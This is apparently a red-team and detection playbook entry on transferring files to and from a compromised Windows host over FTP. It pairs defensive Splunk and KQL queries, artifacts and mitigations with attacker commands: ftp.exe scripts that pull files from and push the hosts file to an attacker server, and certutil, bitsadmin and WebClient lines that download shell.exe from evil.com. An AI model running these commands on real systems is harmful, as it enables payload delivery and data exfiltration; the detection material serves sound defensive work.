notes: Host an FTP server on the attacker: sudo pip3 install pyftpdlib; sudo python3 -m pyftpdlib --port 21 [--write].
name: Windows - FTP Transfer
description: Transfer over FTP with PowerShell's WebClient, or script the built-in ftp.exe client with a command file (the non-interactive ftp -s: method for constrained shells).

variations.label: ftp.exe script - download
variations.command:
echo open <lhost> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

variations.label: ftp.exe script - upload
variations.command:
echo open <lhost> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

defense.why_it_works: The Windows FTP client transfers files to/from an attacker FTP server, often scripted with -s:ftpcommand.txt. Useful when other channels are blocked - but FTP is plaintext and uses port 21, which is frequently filtered outbound.
defense.prerequisites: Code execution on Windows, an attacker FTP server, and outbound FTP (port 21) permitted.
defense.impact: Files transferred over FTP; the module scenario notes 21 is often blocked, so this is a fallback channel.
defense.detection: Outbound FTP (21) to an external host is uncommon in modern networks and easily flagged; the plaintext control channel exposes commands/credentials to inspection; ftp.exe command line and the ftpcommand.txt script file are logged.
defense.artifacts: An FTP control connection on 21 to the attacker; ftp.exe in process logs; a dropped ftpcommand.txt; the transferred file.
defense.splunk_spl:
index=sysmon EventCode=1 (Image="*ftp.exe" OR CommandLine="*ftp://*" OR CommandLine="*ftpcommand.txt*")
| table _time, Computer, User, CommandLine

index=sysmon EventCode=3 DestinationPort=21
| table _time, Computer, Image, DestinationIp
defense.sentinel_kql:
DeviceProcessEvents
| where FileName =~ "ftp.exe" or ProcessCommandLine has "ftp://"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| union (DeviceNetworkEvents | where RemotePort == 21 and RemoteIPType == "Public" | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, ProcessCommandLine=RemoteIP)
| sort by Timestamp desc
// plaintext FTP control channel on 21 to an external host
defense.prevention: [MITRE T1105 M1037 Filter Network Traffic] Use web content filtering to block risky file types (.exe) and whitelist domains (the module scenario shows GitHub/Dropbox/Drive blocked); [M1031 Network Intrusion Prevention] inspect and block transfers at IDS/IPS. Apply application control (WDAC/AppLocker) to block download cradles/LOLBins, and AV/EDR to catch known tooling.
defense.evasion: Only viable where 21 egresses; there is little to hide since FTP is plaintext - encrypt files beforehand so intercepted data is unreadable.
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering - block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review Microsoft Defender for Endpoint, Sysmon for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

explain:
Downloads a file over FTP with PowerShell's WebClient:
  New-Object Net.WebClient      create the download client
  .DownloadFile('ftp://<ip>/file.txt','C:\...\ftp-file.txt')   fetch the FTP URL, save locally
Saves the file to disk; for a constrained cmd shell, script the built-in ftp.exe non-interactively with 'ftp -v -n -s:ftpcommand.txt'.
